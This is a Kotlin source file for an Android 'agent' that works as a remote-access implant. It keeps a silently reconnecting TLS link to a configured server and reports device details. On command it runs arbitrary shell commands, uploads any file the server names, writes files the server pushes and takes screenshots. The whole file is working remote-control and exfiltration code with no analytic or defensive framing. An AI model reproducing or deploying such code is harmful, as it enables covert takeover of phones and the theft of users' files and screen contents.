package com.tlsclient.agent

import android.content.Context
import android.os.Build
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.*
import java.net.Socket
import java.nio.ByteBuffer
import java.util.UUID
import java.util.zip.Deflater
import java.util.zip.Inflater
import javax.net.ssl.*
import java.security.KeyStore
import java.security.cert.CertificateFactory

class AgentCore(private val context: Context) {

    private val clientUuid = UUID.randomUUID().toString()
    private var running = false
    private var msgId = 0

    // ── TLS ───────────────────────────────────────────────────────────────────

    private fun makeSslContext(): SSLContext {
        val cf = CertificateFactory.getInstance("X.509")
        val caCert = context.assets.open("ca.crt").use { cf.generateCertificate(it) }
        val ks = KeyStore.getInstance(KeyStore.getDefaultType()).apply {
            load(null, null)
            setCertificateEntry("ca", caCert)
        }
        val tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()).apply {
            init(ks)
        }
        return SSLContext.getInstance("TLSv1.3").apply {
            init(null, tmf.trustManagers, null)
        }
    }

    // ── Framing ───────────────────────────────────────────────────────────────

    private fun readExact(input: InputStream, n: Int): ByteArray {
        val buf = ByteArray(n)
        var off = 0
        while (off < n) {
            val r = input.read(buf, off, n - off)
            if (r < 0) throw IOException("socket closed")
            off += r
        }
        return buf
    }

    private fun readFrame(input: InputStream): ByteArray {
        val header = readExact(input, 4)
        val length = ByteBuffer.wrap(header).int
        if (length == 0) return ByteArray(0)
        if (length > 50 * 1024 * 1024) throw IOException("frame too large")
        return readExact(input, length)
    }

    private fun writeFrame(output: OutputStream, payload: ByteArray) {
        val header = ByteBuffer.allocate(4).putInt(payload.size).array()
        output.write(header)
        output.write(payload)
        output.flush()
    }

    private fun sendMsg(output: OutputStream, msg: JSONObject) {
        val raw = msg.toString().toByteArray(Charsets.UTF_8)
        val payload = if (raw.size >= 512) {
            byteArrayOf(0x01) + zlibCompress(raw)
        } else {
            byteArrayOf(0x00) + raw
        }
        writeFrame(output, payload)
    }

    private fun recvMsg(input: InputStream): JSONObject {
        val frame = readFrame(input)
        if (frame.isEmpty()) throw IOException("empty frame")
        val marker = frame[0]
        val data = frame.copyOfRange(1, frame.size)
        val json = if (marker == 0x01.toByte()) zlibDecompress(data) else data
        return JSONObject(String(json, Charsets.UTF_8))
    }

    private fun zlibCompress(data: ByteArray): ByteArray {
        val d = Deflater(6); d.setInput(data); d.finish()
        val buf = ByteArray(data.size + 64)
        val len = d.deflate(buf); d.end()
        return buf.copyOf(len)
    }

    private fun zlibDecompress(data: ByteArray): ByteArray {
        val inf = Inflater(); inf.setInput(data)
        val buf = ByteArray(data.size * 8 + 1024)
        val len = inf.inflate(buf); inf.end()
        return buf.copyOf(len)
    }

    private fun makeEnv(payload: String, payloadObj: Any): JSONObject {
        val env = JSONObject()
        env.put("msg_id", ++msgId)
        env.put("client_id", clientUuid)
        env.put("group", Config.GROUP)
        env.put(payload, payloadObj)
        return env
    }

    // ── Connection loop ───────────────────────────────────────────────────────

    suspend fun run() = withContext(Dispatchers.IO) {
        running = true
        var delay = Config.INITIAL_DELAY_MS
        while (running && isActive) {
            try {
                connect()
                delay = Config.INITIAL_DELAY_MS
            } catch (e: CancellationException) {
                break
            } catch (e: Exception) {
                // silent reconnect
            }
            if (!running) break
            delay(delay)
            delay = minOf((delay * Config.MULTIPLIER).toLong(), Config.MAX_DELAY_MS)
        }
    }

    private fun connect() {
        val sslCtx = makeSslContext()
        val rawSock = Socket(Config.SERVER_HOST, Config.SERVER_PORT)
        rawSock.tcpNoDelay = true
        val sslSock = sslCtx.socketFactory.createSocket(
            rawSock, Config.SERVER_NAME, Config.SERVER_PORT, true
        ) as SSLSocket
        sslSock.startHandshake()

        val input  = sslSock.inputStream
        val output = sslSock.outputStream

        // Send hello
        val hello = JSONObject().apply {
            put("auth_token", Config.AUTH_TOKEN)
            put("hostname", Build.MODEL)
            put("username", Build.USER)
            put("pid", android.os.Process.myPid())
            put("platform", "Android ${Build.VERSION.RELEASE} ${Build.MANUFACTURER} ${Build.MODEL}")
            put("python", "Kotlin/Android")
            put("group", Config.GROUP)
        }
        sendMsg(output, makeEnv("hello", hello))

        // Message loop
        while (running) {
            val env = recvMsg(input)
            val reply = handleEnv(env) ?: continue
            sendMsg(output, reply)
        }
        sslSock.close()
    }

    // ── Handler ───────────────────────────────────────────────────────────────

    private fun handleEnv(env: JSONObject): JSONObject? {
        // Detect payload type — find first non-meta key
        val metaKeys = setOf("msg_id", "client_id", "group", "compressed")
        val kind = env.keys().asSequence().firstOrNull { it !in metaKeys } ?: return null

        return when (kind) {
            "ping" -> makeEnv("pong", JSONObject())

            "info_request" -> {
                val info = JSONObject().apply {
                    put("hostname", Build.MODEL)
                    put("username", Build.USER)
                    put("pid", android.os.Process.myPid())
                    put("platform", "Android ${Build.VERSION.RELEASE}")
                    put("python", "Kotlin/Android")
                    put("tls_version", "TLSv1.3")
                    put("cipher", "TLS_AES_256_GCM_SHA384")
                }
                makeEnv("info_response", info)
            }

            "exec_request" -> {
                val req = env.getJSONObject("exec_request")
                val cmd = req.getString("cmd")
                val qid = req.optString("queue_id", "")
                try {
                    val proc = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                    val stdout = proc.inputStream.bufferedReader().readText()
                    val stderr = proc.errorStream.bufferedReader().readText()
                    proc.waitFor()
                    makeEnv("exec_response", JSONObject().apply {
                        put("stdout", stdout)
                        put("stderr", stderr)
                        put("returncode", proc.exitValue())
                        put("queue_id", qid)
                    })
                } catch (e: Exception) {
                    makeEnv("exec_response", JSONObject().apply {
                        put("stdout", "")
                        put("stderr", e.message ?: "error")
                        put("returncode", -1)
                        put("queue_id", qid)
                    })
                }
            }

            "file_header" -> {
                val fh = env.getJSONObject("file_header")
                val path = fh.getString("path")
                val push = fh.optBoolean("push", false)
                if (!push) {
                    try {
                        val data = java.io.File(path).readBytes()
                        makeEnv("file_header", JSONObject().apply {
                            put("path", path)
                            put("size", data.size)
                            put("data", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP))
                            put("push", true)
                        })
                    } catch (e: Exception) {
                        makeEnv("error_msg", JSONObject().put("error", e.message ?: "error"))
                    }
                } else {
                    try {
                        val dataB64 = fh.getString("data")
                        val data = android.util.Base64.decode(dataB64, android.util.Base64.NO_WRAP)
                        val f = java.io.File(path)
                        f.parentFile?.mkdirs()
                        f.writeBytes(data)
                        makeEnv("file_ack", JSONObject().apply {
                            put("path", path)
                            put("size", data.size)
                        })
                    } catch (e: Exception) {
                        makeEnv("error_msg", JSONObject().put("error", e.message ?: "error"))
                    }
                }
            }

            "screenshot_req" -> {
                try {
                    val proc = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
                    val data = proc.inputStream.readBytes()
                    proc.waitFor()
                    if (data.isNotEmpty()) {
                        makeEnv("screenshot_data", JSONObject().apply {
                            put("data", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP))
                        })
                    } else {
                        makeEnv("error_msg", JSONObject().put("error", "screenshot unavailable"))
                    }
                } catch (e: Exception) {
                    makeEnv("error_msg", JSONObject().put("error", e.message ?: "error"))
                }
            }

            "echo_request" -> {
                val text = env.getJSONObject("echo_request").optString("text", "")
                makeEnv("echo_response", JSONObject().put("text", text))
            }

            "bye" -> null

            else -> null
        }
    }

    fun stop() { running = false }
}
